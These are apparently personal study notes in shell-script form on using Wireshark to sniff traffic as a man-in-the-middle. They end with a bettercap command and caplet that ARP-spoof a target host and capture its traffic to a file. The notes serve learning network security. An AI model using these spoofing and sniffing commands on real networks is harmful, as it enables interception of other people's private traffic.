:'
- wireshark is network protocol analyser
- designed to help network administrator to keep track of what is happenning in their network
- it logs packets that flows through the selected interface
- the inteface must be your computers interface
- it analyses all the packets
- when we are the MITM, wireshark can be used to sniff and analyse traffic sent/received by targets
- when we are the MITM, all traffic are routed through us and we can use wireshark to analyze all these traffic
'

# you can choose a file to load to the wireshark
# these could be capture files that you could have gotten from the
# airodump, or 

:'
wireshark options:
1. you can click on the options icon,
2. you can select more than one interface
3. Output, you can store the packets youre sniffing to a file
4. after setting up your options, you can now click start
'


bettercap -iface eth0 -caplet spoof.cap
:'
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 10.0.2.7
arp.spoof on
set net.sniff.local true
set net.sniff.output capturefile.cap
net.sniff on
'